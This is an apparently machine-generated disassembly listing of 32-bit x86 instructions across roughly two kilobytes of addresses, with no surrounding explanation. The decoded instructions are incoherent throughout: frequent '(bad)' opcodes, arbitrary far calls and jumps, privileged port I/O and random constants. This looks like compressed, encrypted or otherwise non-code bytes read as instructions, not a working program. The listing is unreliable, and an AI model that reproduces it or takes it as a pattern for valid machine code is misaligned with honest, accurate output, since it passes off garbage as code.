  421789:	mov    ss,WORD PTR [esi+0x3135538e]
  42178f:	xchg   ebp,eax
  421790:	pop    edi
  421791:	xor    BYTE PTR [edx],0xc7
  421794:	push   edi
  421795:	dec    ebp
  421796:	les    edx,FWORD PTR [ebp-0x1b]
  421799:	mov    ch,0x41
  42179b:	xlat   BYTE PTR ds:[ebx]
  42179c:	or     eax,0x84496533
  4217a1:	dec    edi
  4217a2:	es push cs
  4217a4:	jns    0x42173d
  4217a6:	mov    WORD PTR [eax+esi*4],cs
  4217a9:	jnp    0x421767
  4217ab:	retf   0x4126
  4217ae:	fidiv  WORD PTR [esi-0x5e]
  4217b1:	pushf  
  4217b2:	mov    WORD PTR [ecx],cs
  4217b4:	stos   DWORD PTR es:[edi],eax
  4217b5:	fld    TBYTE PTR ds:0x50702efc
  4217bb:	cs loopne 0x421836
  4217be:	(bad)  
  4217bf:	cmp    dh,BYTE PTR [ebx-0x2a]
  4217c2:	cmp    ch,ah
  4217c4:	imul   ebx,DWORD PTR [ebx],0xa81c1c1f
  4217ca:	jg     0x42180d
  4217cc:	js     0x421767
  4217ce:	dec    esi
  4217cf:	fldcw  WORD PTR [ecx-0x4d]
  4217d2:	int    0xe3
  4217d4:	mov    ebx,0x41de6821
  4217d9:	and    al,0x43
  4217db:	inc    edi
  4217dc:	pop    ds
  4217dd:	ficom  DWORD PTR [ecx-0x69]
  4217e0:	icebp  
  4217e1:	jge    0x421858
  4217e3:	xor    al,0x80
  4217e5:	mov    ebp,0xe0d760b6
  4217ea:	xchg   BYTE PTR [ecx-0x46],cl
  4217ed:	popf   
  4217ee:	pop    es
  4217ef:	cdq    
  4217f0:	push   ebp
  4217f1:	jge    0x4217d9
  4217f3:	xchg   esp,esp
  4217f5:	jo     0x4217d3
  4217f7:	int    0x6a
  4217f9:	cmp    eax,DWORD PTR [ebp-0x3d]
  4217fc:	inc    esi
  4217fd:	mov    DWORD PTR [edi-0x6c],0x43b4ab97
  421804:	scas   eax,DWORD PTR es:[edi]
  421805:	or     al,0x5
  421807:	xchg   edi,eax
  421808:	neg    bl
  42180a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42180b:	xchg   ebp,eax
  42180c:	push   ss
  42180d:	add    al,0x2a
  42180f:	or     edi,esi
  421811:	retf   0xc1cf
  421814:	es or  dl,dl
  421817:	mov    bl,0xb7
  421819:	mov    ds:0x6d176cc,eax
  42181e:	and    ch,ch
  421820:	push   edi
  421821:	(bad)  [esi-0x22]
  421824:	fcom   DWORD PTR [eax]
  421826:	test   al,0x51
  421828:	sbb    al,0x44
  42182a:	test   DWORD PTR [ebx+0x2a],ebp
  42182d:	pop    ds
  42182e:	shl    al,cl
  421830:	(bad)  
  421831:	idiv   BYTE PTR [ebx+edx*4]
  421834:	les    ebp,FWORD PTR [eax+0x4014c8c5]
  42183a:	es push eax
  42183c:	js     0x421825
  42183e:	cmp    al,BYTE PTR [eax]
  421840:	ja     0x421896
  421842:	sbb    BYTE PTR [ebp-0x225163c6],bl
  421848:	iret   
  421849:	sub    edi,ebp
  42184b:	mov    eax,?
  42184d:	mov    esi,DWORD PTR [ebp-0x7a]
  421850:	cmp    al,0x3b
  421852:	cmp    DWORD PTR [esi],ebx
  421854:	stos   BYTE PTR es:[edi],al
  421855:	popf   
  421856:	cli    
  421857:	push   eax
  421858:	add    al,0x63
  42185a:	das    
  42185b:	gs int3 
  42185d:	push   ds
  42185e:	xor    eax,0xfd73fd35
  421863:	jnp    0x421886
  421865:	xor    dl,BYTE PTR ds:[edi]
  421868:	popf   
  421869:	or     al,BYTE PTR [ecx+0x59f275a7]
  42186f:	mov    dl,ch
  421871:	mov    es,WORD PTR [ebp+0x2dce1dde]
  421877:	repz pop ss
  421879:	in     eax,0x25
  42187b:	push   edx
  42187c:	and    eax,0xe2412a0d
  421881:	cdq    
  421882:	push   ss
  421883:	cwde   
  421884:	and    BYTE PTR [ebp+ebx*8+0x14],cl
  421888:	add    eax,0x3d889dd8
  42188d:	push   esi
  42188e:	jb     0x421898
  421890:	adc    DWORD PTR [esi],edi
  421892:	and    DWORD PTR [edi-0x2d],edi
  421895:	jb     0x421845
  421897:	or     al,0xf8
  421899:	xor    BYTE PTR [ebx+0x2a2679e4],0x47
  4218a0:	data16 sti 
  4218a2:	sbb    BYTE PTR [eax],dl
  4218a4:	push   0xb745cfc2
  4218a9:	imul   edi,DWORD PTR [ebp+ebx*2+0x4f],0x34
  4218ae:	xchg   esi,eax
  4218af:	mov    ecx,DWORD PTR [edi+0x45]
  4218b2:	dec    ebp
  4218b3:	jo     0x42189b
  4218b5:	clc    
  4218b6:	jo     0x421865
  4218b8:	test   edx,esp
  4218ba:	cld    
  4218bb:	sbb    BYTE PTR [ecx],bl
  4218bd:	xor    eax,0x7e9e0325
  4218c2:	in     eax,0xd5
  4218c4:	xchg   edi,eax
  4218c5:	xchg   ebx,eax
  4218c6:	retf   0xdff5
  4218c9:	mov    WORD PTR [ecx],gs
  4218cb:	pop    ebp
  4218cc:	mov    bl,0x53
  4218ce:	es mov ebp,0xf0a87616
  4218d4:	push   eax
  4218d5:	stc    
  4218d6:	repz jns 0x421947
  4218d9:	sub    ebx,DWORD PTR [esi]
  4218db:	jae    0x421903
  4218dd:	pop    ss
  4218de:	jno    0x421894
  4218e0:	(bad)  
  4218e1:	mov    eax,ds:0x235fbe2a
  4218e6:	xchg   edx,eax
  4218e7:	adc    al,0x9a
  4218e9:	rol    BYTE PTR [ebx+0xc],0xf7
  4218ed:	loope  0x421912
  4218ef:	push   0x99c9f393
  4218f4:	dec    esp
  4218f5:	bound  esp,QWORD PTR [esi]
  4218f7:	add    DWORD PTR [ebx+0x5d],esi
  4218fa:	aad    0x40
  4218fc:	iret   
  4218fd:	pop    eax
  4218fe:	loope  0x42194e
  421900:	push   ebp
  421901:	nop
  421902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421903:	cmc    
  421904:	shl    BYTE PTR [ecx],1
  421906:	mov    dl,0xa2
  421908:	(bad)  
  421909:	idiv   DWORD PTR [edx]
  42190b:	mov    ?,WORD PTR [edx]
  42190d:	jge    0x42195a
	...
  421917:	add    BYTE PTR [eax],al
  421919:	add    BYTE PTR [eax-0x4456c5cd],dh
  42191f:	test   eax,0x428f3bb3
  421924:	mov    esp,0xdb05fd8a
  421929:	jb     0x421918
  42192b:	xchg   esp,eax
  42192c:	add    DWORD PTR [eax],eax
  42192e:	std    
  42192f:	add    DWORD PTR [eax],eax
  421931:	add    BYTE PTR [esi],ch
  421933:	(bad)  
  421934:	jb     0x42196b
  421936:	imul   esi,DWORD PTR [eax+esi*4-0x78],0xfffffff4
  42193b:	push   eax
  42193c:	(bad)  [esi+0x513ce377]
  421942:	pop    bp
  421944:	jb     0x4219ad
  421946:	fs das 
  421948:	adc    esp,DWORD PTR [ebp-0x59]
  42194b:	int    0xfe
  42194d:	and    al,0xc9
  42194f:	push   edi
  421950:	imul   eax,DWORD PTR [ecx+0x6d],0xe94277e2
  421957:	xor    eax,DWORD PTR [esi-0x3b64fb6]
  42195d:	lods   al,BYTE PTR ds:[esi]
  42195e:	call   0xe6a7:0x259d83d8
  421965:	lods   al,BYTE PTR fs:[esi]
  421967:	jae    0x421929
  421969:	jns    0x4219d3
  42196b:	fwait
  42196c:	je     0x421926
  42196e:	scas   al,BYTE PTR es:[edi]
  42196f:	outs   dx,DWORD PTR ds:[esi]
  421970:	push   ss
  421971:	addr16 test al,0x85
  421974:	push   ebp
  421975:	arpl   WORD PTR [esi+0x57],sp
  421978:	sub    eax,0x40490d6f
  42197d:	in     eax,0xc
  42197f:	push   cs
  421980:	and    eax,0xf476eb58
  421985:	hlt    
  421986:	mov    bl,0xde
  421988:	(bad)  
  421989:	jbe    0x4219e4
  42198b:	shl    BYTE PTR [esi-0x12],1
  42198e:	mov    edi,0xa8d68a23
  421993:	mov    al,ds:0x5708516b
  421998:	xchg   esi,eax
  421999:	sub    DWORD PTR [esi+ecx*2],esi
  42199c:	mov    bl,0xdc
  42199e:	(bad)  
  42199f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219a0:	lahf   
  4219a1:	daa    
  4219a2:	jbe    0x421a07
  4219a4:	sbb    al,0xef
  4219a6:	jmp    0xa847:0xe88ad155
  4219ad:	jge    0x4219ab
  4219af:	push   ss
  4219b0:	jp     0x42194b
  4219b2:	xor    al,0x7b
  4219b4:	sbb    dh,dh
  4219b6:	loopne 0x4219a2
  4219b8:	(bad)  
  4219b9:	imul   esi,DWORD PTR ds:0xc0499d0f,0xffffffc7
  4219c0:	leave  
  4219c1:	pop    esp
  4219c2:	sub    ebp,DWORD PTR [edi+0x65255460]
  4219c8:	jne    0x4219ad
  4219ca:	popw   ss
  4219cc:	sub    DWORD PTR [eax+0x35f65da0],eax
  4219d2:	ret    0xe1c4
  4219d5:	clc    
  4219d6:	sub    DWORD PTR [eax-0x36],eax
  4219d9:	aaa    
  4219da:	dec    ebx
  4219db:	inc    edi
  4219dc:	add    al,0x3e
  4219de:	mov    al,ds:0x88d5d72c
  4219e4:	cmp    ecx,esi
  4219e6:	shr    BYTE PTR [esi],cl
  4219e8:	push   edi
  4219e9:	jl     0x4219f7
  4219eb:	out    dx,al
  4219ec:	xchg   esp,eax
  4219ed:	xchg   ah,ah
  4219ef:	push   ecx
  4219f0:	xlat   BYTE PTR ds:[ebx]
  4219f1:	xchg   ebp,eax
  4219f2:	fcompp 
  4219f4:	ins    DWORD PTR es:[edi],dx
  4219f5:	adc    BYTE PTR [ecx+0x37],dh
  4219f8:	or     al,0x8
  4219fa:	ins    BYTE PTR es:[edi],dx
  4219fb:	(bad)  
  4219fc:	mov    edi,0x9b6033dd
  421a01:	sbb    edi,0x1f08f289
  421a07:	push   edx
  421a08:	and    ecx,ecx
  421a0a:	sub    BYTE PTR [eax],bl
  421a0c:	mov    edx,0x43ce0d49
  421a11:	mov    DWORD PTR [ecx+ebx*4],ebp
  421a14:	push   0x9a776388
  421a19:	scas   al,BYTE PTR es:[edi]
  421a1a:	call   0x9afb:0x83ff5e72
  421a21:	in     al,0x7a
  421a23:	pop    es
  421a24:	push   esp
  421a25:	inc    eax
  421a26:	xor    ah,BYTE PTR [edx]
  421a28:	inc    ecx
  421a29:	call   0xad12:0x3c376fa3
  421a30:	pop    ecx
  421a31:	in     eax,0x69
  421a33:	xchg   edx,eax
  421a34:	aad    0x24
  421a36:	daa    
  421a37:	arpl   WORD PTR [esi],cx
  421a39:	out    0x0,eax
  421a3b:	inc    edi
  421a3c:	arpl   WORD PTR [eax+edi*8+0x4d459070],sp
  421a43:	outs   dx,BYTE PTR ds:[esi]
  421a44:	pop    edi
  421a45:	inc    ecx
  421a46:	or     al,0xe0
  421a48:	test   DWORD PTR [eax+0x6e],ebx
  421a4b:	mov    esi,0xd1e62d65
  421a50:	pop    esi
  421a51:	clc    
  421a52:	push   es
  421a53:	jge    0x421a5c
  421a55:	fs cs push ss
  421a58:	or     eax,DWORD PTR [edi]
  421a5a:	or     ch,BYTE PTR [esp+edx*4+0x0]
  421a5e:	xchg   ecx,eax
  421a5f:	jge    0x421a1a
  421a61:	mov    DWORD PTR [edx-0x20],ecx
  421a64:	(bad)  
  421a65:	jo     0x421aa8
  421a67:	(bad)  
  421a68:	in     eax,0xcd
  421a6a:	pop    ebx
  421a6b:	sbb    dl,ah
  421a6d:	hlt    
  421a6e:	stos   DWORD PTR es:[edi],eax
  421a6f:	fstp   QWORD PTR [edx]
  421a71:	lahf   
  421a72:	add    al,0x14
  421a74:	mov    ah,0x99
  421a76:	xor    al,0xa5
  421a78:	bound  esi,QWORD PTR [edi]
  421a7a:	xlat   BYTE PTR ds:[ebx]
  421a7b:	sar    DWORD PTR [edx-0x35],0xfa
  421a7f:	push   edi
  421a80:	pop    es
  421a81:	sbb    eax,0xc6b3626a
  421a86:	ret    
  421a87:	pop    es
  421a88:	lock jo 0x421a4a
  421a8b:	popa   
  421a8c:	mov    ebx,0x58f3d851
  421a91:	out    dx,al
  421a92:	lock mov edi,0x298e393c
  421a98:	pusha  
  421a99:	or     DWORD PTR [ebx-0x40],0xc8533ddd
  421aa0:	ins    DWORD PTR es:[edi],dx
  421aa1:	enter  0x8d1,0x58
  421aa5:	sub    al,0x44
  421aa7:	mov    esp,esp
  421aa9:	add    esi,DWORD PTR [ebx]
  421aab:	cs dec edx
  421aad:	and    DWORD PTR fs:[edi+0x7a],esi
  421ab1:	sbb    ch,bh
  421ab3:	je     0x421b24
  421ab5:	mov    cs,WORD PTR [edx+0x6dc3c52c]
  421abb:	mov    eax,ds:0x7ab0af57
  421ac0:	xchg   ebp,eax
  421ac1:	cs mov al,0x13
  421ac4:	fld    DWORD PTR [esi-0x7d]
  421ac7:	xor    eax,DWORD PTR [ebx+0xf0bc9be]
  421acd:	mov    edx,0x60b1f66a
  421ad2:	lahf   
  421ad3:	xor    al,0x52
  421ad5:	sbb    eax,0xe4bd1a22
  421ada:	or     al,0x2a
  421adc:	fistp  WORD PTR [esi+0x61a96371]
  421ae2:	xchg   ecx,eax
  421ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ae4:	mov    edx,0xbf395add
  421ae9:	(bad)  
  421aea:	in     al,0x70
  421aec:	shr    ch,1
  421aee:	mov    eax,0xc373c074
  421af3:	cli    
  421af4:	ror    cl,0xd5
  421af7:	sub    edx,DWORD PTR [ecx+esi*8-0x20]
  421afb:	mov    al,0x2d
  421afd:	jb     0x421a98
  421aff:	adc    bl,BYTE PTR [edi]
  421b01:	cmp    edi,esp
  421b03:	pushf  
  421b04:	mov    bh,0xa
  421b06:	jmp    0x421b74
  421b08:	cmp    DWORD PTR [edi],ecx
  421b0a:	bound  edx,QWORD PTR ds:0xd2d18b13
  421b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b11:	jle    0x421b50
  421b13:	or     BYTE PTR [edi+0x1c2607d5],0x1d
  421b1a:	out    dx,al
  421b1b:	retf   
  421b1c:	test   ecx,edi
  421b1e:	mov    bh,0x7f
  421b20:	repz or BYTE PTR [ecx-0x2e610ede],ah
  421b27:	pop    ecx
  421b28:	das    
  421b29:	sbb    ecx,DWORD PTR [edx-0x507d2e17]
	...
  421b37:	add    BYTE PTR [eax],al
  421b39:	add    BYTE PTR [ecx-0x6b36a2],ch
  421b3f:	xchg   edi,eax
  421b40:	std    
  421b41:	jg     0x421b32
  421b43:	mov    edi,0xcaa9f8f7
  421b48:	xchg   edx,eax
  421b49:	in     eax,dx
  421b4a:	jmp    0x1:0xfd000196
  421b51:	add    BYTE PTR [esi+0x20f146a],cl
  421b57:	stc    
  421b58:	push   es
  421b59:	mov    eax,0x6c7daa34
  421b5e:	xor    esp,DWORD PTR [edx+0x6c130d9]
  421b64:	imul   esp,DWORD PTR [eax+0x771ae3a3],0x569ca133
  421b6e:	ins    BYTE PTR es:[edi],dx
  421b6f:	jp     0x421bb9
  421b71:	and    BYTE PTR [esi],0xb5
  421b74:	not    DWORD PTR [esi]
  421b76:	repnz fcmovnb st,st(7)
  421b79:	loop   0x421b12
  421b7b:	xor    eax,DWORD PTR [ebx]
  421b7d:	mov    bl,0x11
  421b7f:	sub    eax,0xc1c5a5ce
  421b84:	jl     0x421ba9
  421b86:	int    0xf0
  421b88:	sahf   
  421b89:	test   BYTE PTR [esp+esi*4+0x283d140e],0xf2
  421b91:	and    al,0x86
  421b93:	jno    0x421b36
  421b95:	mul    ebp
  421b97:	mov    eax,0x2c779bb
  421b9c:	dec    eax
  421b9d:	fnstenv [ebx-0x32]
  421ba0:	mov    edx,0x2e5938ba
  421ba5:	pop    edi
  421ba6:	jne    0x421b9d
  421ba8:	or     DWORD PTR [esi],esi
  421baa:	outs   dx,DWORD PTR ds:[esi]
  421bab:	das    
  421bac:	sti    
  421bad:	sub    ch,BYTE PTR [edi+0x5b]
  421bb0:	pminsw mm4,QWORD PTR [ebx+0x33d38626]
  421bb7:	fwait
  421bb8:	sbb    esi,ecx
  421bba:	ficomp DWORD PTR [edi]
  421bbc:	mov    ah,BYTE PTR [esi]
  421bbe:	mov    ds:0x79077c,eax
  421bc3:	aam    0x56
  421bc5:	mov    ds:0xc9852a95,eax
  421bca:	xchg   edi,eax
  421bcb:	pop    esp
  421bcc:	xor    ebx,DWORD PTR [edx+0x8d85835]
  421bd2:	loope  0x421bb7
  421bd4:	add    eax,DWORD PTR [edi+ebx*1+0x2dae9d61]
  421bdb:	leave  
  421bdc:	mov    esi,0x23dba37d
  421be1:	aaa    
  421be2:	and    BYTE PTR [ecx],0xf5
  421be5:	push   edx
  421be6:	xor    cl,BYTE PTR [eax-0xb2a7e73]
  421bec:	sbb    DWORD PTR [ebx],esp
  421bee:	push   esp
  421bf0:	cwde   
  421bf1:	inc    edx
  421bf2:	popa   
  421bf3:	(bad)  
  421bf4:	pushf  
  421bf5:	outs   dx,DWORD PTR ds:[esi]
  421bf6:	push   ebx
  421bf7:	outs   dx,BYTE PTR ds:[esi]
  421bf8:	mov    al,0xd5
  421bfb:	sub    al,BYTE PTR [ebp+0x6b5d9a03]
  421c01:	mov    ?,WORD PTR [ecx+0x7c]
  421c04:	popa   
  421c05:	cmp    al,0x9c
  421c07:	adc    DWORD PTR [edx-0x1d],edi
  421c0a:	cmp    DWORD PTR [ecx],eax
  421c0c:	jo     0x421bd7
  421c0e:	jae    0x421bc3
  421c10:	sahf   
  421c11:	add    eax,0x4595d22d
  421c16:	inc    ebx
  421c17:	xor    dl,BYTE PTR [ebx]
  421c19:	test   DWORD PTR [ebx+0x31456bf4],ebp
  421c1f:	nop
  421c20:	mov    ebx,0xc4c8c408
  421c25:	leave  
  421c26:	out    0xd0,al
  421c28:	cwde   
  421c29:	inc    esi
  421c2a:	and    al,0xea
  421c2c:	mov    es,ebp
  421c2e:	xchg   esi,eax
  421c2f:	retf   0xbf5a
  421c32:	jne    0x421c77
  421c34:	sbb    eax,DWORD PTR [ebx-0x609b27e]
  421c3a:	ror    dl,0xa7
  421c3d:	call   0xccec:0x550955f9
  421c44:	es (bad) 
  421c46:	fnstsw WORD PTR ds:0xcdd075da
  421c4c:	mov    BYTE PTR [ecx+0x39],dl
  421c4f:	leave  
  421c50:	mov    edi,0x1f0c46fa
  421c55:	jnp    0x421c80
  421c57:	int    0x3b
  421c59:	repz mov ah,BYTE PTR [ecx+0x27c9286d]
  421c60:	nop/reserved BYTE PTR [ecx+0x21273191]
  421c67:	adc    dl,BYTE PTR [edi-0x14]
  421c6a:	js     0x421c8f
  421c6c:	or     bl,BYTE PTR [esi-0x6a]
  421c6f:	jmp    0xe8b0d2b
  421c74:	bound  edx,QWORD PTR [esi+0x6]
  421c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c78:	dec    esp
  421c79:	xlat   BYTE PTR ds:[ebx]
  421c7a:	cmp    al,BYTE PTR [edx-0xb2ee0a5]
  421c80:	mov    al,0xb8
  421c82:	pop    edx
  421c83:	aam    0xb4
  421c85:	dec    edi
  421c86:	mov    ecx,0xf8758122
  421c8b:	mov    cl,BYTE PTR [esi+0x43f364ca]
  421c91:	or     eax,0x3c75e196
  421c96:	adc    al,BYTE PTR [edi-0x9848204]
  421c9c:	dec    ecx
  421c9d:	xor    eax,0x2b68c022
  421ca2:	push   ecx
  421ca3:	jae    0x421ce6
  421ca5:	retf   
  421ca6:	aam    0xab
  421ca8:	aam    0x4c
  421caa:	sar    DWORD PTR [edi],cl
  421cac:	fsubp  st(0),st
  421cae:	mov    esp,0x998bc997
  421cb3:	std    
  421cb4:	call   0x2853:0xcc3ed2ac
  421cbb:	ins    DWORD PTR es:[edi],dx
  421cbc:	stos   BYTE PTR es:[edi],al
  421cbd:	int3   
  421cbe:	jne    0x421cf3
  421cc0:	fxam   
  421cc2:	(bad)  
  421cc4:	pusha  
  421cc5:	imul   esp,DWORD PTR [ebp+0x464b642a],0xffffff9e
  421ccc:	xchg   BYTE PTR ds:[edi+0x5ad7a876],cl
  421cd3:	in     eax,0x77
  421cd5:	call   0x60cd0e8e
  421cda:	xchg   esp,eax
  421cdb:	pop    ss
  421cdc:	or     DWORD PTR ds:0xfa920e5e,ecx
  421ce2:	rcl    dh,cl
  421ce4:	fmul   st,st(3)
  421ce6:	test   cl,bl
  421ce8:	jle    0x421c98
  421cea:	outs   dx,DWORD PTR ds:[esi]
  421ceb:	(bad)  
  421cec:	loope  0x421d51
  421cee:	cld    
  421cef:	ror    DWORD PTR [ecx],cl
  421cf1:	jmp    DWORD PTR [ebp+0x7e1d755b]
  421cf7:	(bad)  
  421cf8:	lods   eax,DWORD PTR ds:[esi]
  421cf9:	test   DWORD PTR [ebx-0x28468a68],edi
  421cff:	push   0xffffffe2
  421d01:	sub    BYTE PTR [esi-0x6f],ah
  421d04:	and    al,0x2a
  421d06:	loopne 0x421cf2
  421d08:	mov    cl,0x1d
  421d0a:	add    ah,BYTE PTR [ebp+0x1b700ea8]
  421d10:	xchg   esp,eax
  421d11:	test   esp,0xff0abe21
  421d17:	pop    ss
  421d18:	or     ah,BYTE PTR [edx+edx*2]
  421d1b:	jmp    0x421c9f
  421d1d:	push   es
  421d1e:	icebp  
  421d1f:	and    BYTE PTR [edx],ch
  421d21:	add    eax,0xd8aeaaf1
  421d26:	sti    
  421d27:	rcr    BYTE PTR [esi+0x2f13b82c],cl
  421d2d:	xchg   DWORD PTR [ecx],ebp
  421d2f:	pop    es
  421d30:	mov    bh,0xc8
  421d32:	(bad)  [esi]
  421d34:	jbe    0x421cea
  421d36:	add    BYTE PTR [ebx],0x2c
  421d39:	cwde   
  421d3a:	mov    dh,0x57
  421d3c:	ror    DWORD PTR [ecx],1
  421d3e:	xchg   ebx,eax
  421d3f:	aam    0xc0
  421d41:	pop    es
  421d42:	push   edi
  421d43:	sub    dl,BYTE PTR [edx-0x15]
  421d46:	push   ebx
  421d47:	add    ah,BYTE PTR [ebp+0x2c]
  421d4a:	mov    edx,eax
  421d4c:	test   eax,0x185b
	...
  421d59:	add    BYTE PTR [ebx+0x7d7539cf],bh
  421d5f:	idiv   edi
  421d61:	iret   
  421d62:	(bad)  
  421d63:	ror    DWORD PTR [ebp+0x6d],1
  421d66:	fisttp WORD PTR [ecx-0x67186190]
  421d6c:	add    DWORD PTR [eax],eax
  421d6e:	std    
  421d6f:	add    DWORD PTR [eax],eax
  421d71:	add    BYTE PTR [eax],bl
  421d73:	clc    
  421d74:	jecxz  0x421ded
  421d76:	inc    ebp
  421d77:	(bad)  
  421d78:	cmp    al,0x53
  421d7a:	add    ebp,DWORD PTR [ebx+0x6273d4d1]
  421d80:	stc    
  421d81:	add    eax,0xb23bb74a
  421d86:	cmp    DWORD PTR [ebx+0x1ea4d4],esp
  421d8c:	push   ss
  421d8d:	data16 or al,0xa1
  421d90:	xor    BYTE PTR [ebx+0x3dc6f45a],0x5d
  421d97:	ja     0x421d43
  421d99:	cmp    al,0x2e
  421d9b:	lds    ebp,FWORD PTR [ebp-0x60]
  421d9e:	push   cs
  421d9f:	add    DWORD PTR [esi+edi*8-0x6],eax
  421da3:	out    dx,al
  421da4:	icebp  
  421da5:	jns    0x421e01
  421da7:	out    0xe7,eax
  421da9:	cmc    
  421daa:	lahf   
  421dab:	mov    esi,0xf30dc5a4
  421db0:	bound  ecx,QWORD PTR [edx]
  421db2:	mov    dh,0x68
  421db4:	daa    
  421db5:	mov    dl,0xd
  421db7:	and    al,0x5c
  421db9:	jmp    0xb951:0xa5a050fe
  421dc0:	xchg   esi,eax
  421dc1:	or     DWORD PTR [ecx],ebp
  421dc3:	aad    0xdd
  421dc5:	repnz mov ebx,0xd08e5ee7
  421dcb:	aas    
  421dcc:	mov    bh,BYTE PTR [ebp-0x21de48f3]
  421dd2:	addr16 and al,0xfa
  421dd5:	mov    DWORD PTR [ebx-0x39],eax
  421dd8:	stos   BYTE PTR es:[edi],al
  421dd9:	in     al,dx
  421dda:	dec    esp
  421ddb:	pusha  
  421ddc:	call   0x7f69:0x5c2a9d1d
  421de3:	out    0xff,eax
  421de5:	mov    edx,0x59248cc2
  421dea:	retf   0xdc20
  421ded:	jle    0x421dd2
  421def:	xor    eax,0x115455a6
  421df4:	dec    esp
  421df5:	cld    
  421df6:	sbb    al,0x3d
  421df8:	inc    ecx
  421df9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dfa:	aas    
  421dfb:	mov    edx,0xfebb581c
  421e00:	ror    WORD PTR [ebx+0x29],1
  421e04:	push   esi
  421e05:	adc    BYTE PTR [ecx],bl
  421e07:	xor    cl,ch
  421e09:	adc    eax,0xa9bd18bb
  421e0e:	mov    ds:0x2f81680,al
  421e13:	aad    0x15
  421e15:	inc    ebp
  421e16:	pusha  
  421e17:	test   al,0x49
  421e19:	into   
  421e1a:	xchg   esp,eax
  421e1b:	push   ebp
  421e1c:	sbb    al,0x8f
  421e1e:	add    ah,BYTE PTR ds:0x96a81e2d
  421e24:	dec    ecx
  421e25:	bound  ebx,QWORD PTR [ebx-0x7c]
  421e28:	push   edx
  421e29:	xchg   esi,eax
  421e2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e2b:	push   0x6b
  421e2d:	test   DWORD PTR [ecx+0x68a051a8],eax
  421e33:	neg    BYTE PTR [ebp+0x4b]
  421e36:	push   eax
  421e37:	shl    ah,1
  421e39:	xchg   esi,eax
  421e3a:	pop    es
  421e3b:	out    dx,al
  421e3c:	xchg   BYTE PTR [edx-0xa],bh
  421e3f:	jle    0x8f32d127
  421e45:	ins    BYTE PTR es:[edi],dx
  421e46:	ins    BYTE PTR es:[edi],dx
  421e47:	push   ebp
  421e48:	mov    al,0xcf
  421e4a:	adc    BYTE PTR ds:0x8f9260d,ah
  421e50:	jmp    0xa66879a6
  421e55:	lds    esi,FWORD PTR [edx]
  421e57:	jne    0x421e48
  421e59:	adc    DWORD PTR [eax],0xffffffa5
  421e5c:	mov    cl,0x31
  421e5e:	cmp    DWORD PTR [eax-0x51],ecx
  421e61:	shl    BYTE PTR [esi-0x437acfa2],cl
  421e67:	(bad)  
  421e69:	in     eax,dx
  421e6a:	mov    ebp,0x42166df
  421e6f:	sbb    eax,0xf621aba5
  421e74:	iret   
  421e75:	xor    dh,BYTE PTR [esi]
  421e77:	cwde   
  421e78:	pop    esp
  421e79:	cld    
  421e7a:	int    0x7b
  421e7c:	inc    esi
  421e7d:	stos   DWORD PTR es:[edi],eax
  421e7e:	clc    
  421e7f:	lds    esp,FWORD PTR [ecx-0x3b]
  421e82:	mov    es,ecx
  421e84:	sti    
  421e85:	cmc    
  421e86:	bound  ecx,QWORD PTR [eax+0x48]
  421e89:	jmp    0x421e2f
  421e8b:	sbb    esi,ecx
  421e8d:	add    DWORD PTR [ebp+0x25],0xffffff98
  421e91:	cmp    BYTE PTR [edi],cl
  421e93:	mov    ecx,esi
  421e95:	or     al,0x71
  421e97:	inc    esi
  421e98:	pop    eax
  421e99:	xchg   edi,eax
  421e9a:	mul    bh
  421e9c:	(bad)  
  421e9d:	jmp    eax
  421e9f:	mov    ds:0x8c4caf79,al
  421ea4:	adc    DWORD PTR [ecx-0x24a836e3],edx
  421eaa:	sbb    bl,0x95
  421ead:	xchg   edi,eax
  421eae:	stos   DWORD PTR es:[edi],eax
  421eaf:	fisubr DWORD PTR [ebx]
  421eb1:	fisub  WORD PTR [ecx+0x58]
  421eb4:	dec    esp
  421eb5:	into   
  421eb6:	std    
  421eb7:	retf   
  421eb8:	sub    eax,0x8e06f766
  421ebd:	outs   dx,BYTE PTR ds:[esi]
  421ebe:	and    eax,0x57ce6fe1
  421ec3:	aad    0x47
  421ec5:	fdivr  DWORD PTR ds:0xcfcc7cf3
  421ecb:	xchg   ecx,eax
  421ecc:	cwde   
  421ecd:	int3   
  421ece:	dec    ebp
  421ecf:	cld    
  421ed0:	and    DWORD PTR [eax],0x68
  421ed3:	sub    BYTE PTR [bp+si+0x6b35],dh
  421ed8:	sub    bl,BYTE PTR [ebp+0x7c]
  421edb:	ins    BYTE PTR es:[edi],dx
  421edc:	mov    esp,0x2fa82c80
  421ee1:	fcom   DWORD PTR [ebx+0x105357a3]
  421ee7:	out    0xb4,al
  421ee9:	dec    ebp
  421eea:	jno    0x421f29
  421eec:	in     eax,0xe1
  421eee:	cmp    bl,al
  421ef0:	out    0x17,eax
  421ef2:	sub    edx,ebx
  421ef4:	aam    0x59
  421ef6:	push   ebx
  421ef7:	sbb    edx,esi
  421ef9:	sub    bh,BYTE PTR [edx+esi*8-0x5e]
  421efd:	pushf  
  421efe:	pop    ds
  421eff:	add    DWORD PTR [ebp+ebx*1+0x25],edx
  421f03:	mov    dl,0x79
  421f05:	cmp    eax,ebx
  421f07:	fstp   st(7)
  421f09:	pop    esp
  421f0a:	mov    esi,0xb962f45a
  421f0f:	icebp  
  421f10:	mov    dl,0x68
  421f12:	mov    ebp,0x72e6e271
  421f17:	scas   al,BYTE PTR es:[edi]
  421f18:	aad    0xa5
  421f1a:	mov    al,0xe5
  421f1c:	dec    edi
  421f1d:	std    
  421f1e:	cmp    DWORD PTR [edi+0x1c857e9c],0x456f00ba
  421f28:	fwait
  421f29:	dec    ecx
  421f2a:	and    al,0xfb
  421f2c:	mov    fs,WORD PTR [ecx+0x79]
  421f2f:	sbb    cl,BYTE PTR [edi+0x52]
  421f32:	jo     0x421f56
  421f34:	(bad)  
  421f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f36:	and    DWORD PTR [edi],edx
  421f38:	cmc    
  421f39:	push   esp
  421f3a:	jbe    0x421efb
  421f3c:	enter  0x5995,0xe4
  421f40:	mov    fs,WORD PTR [ecx-0x284fafbc]
  421f46:	sbb    esp,DWORD PTR [esi+0xe]
  421f49:	xchg   ecx,ebp
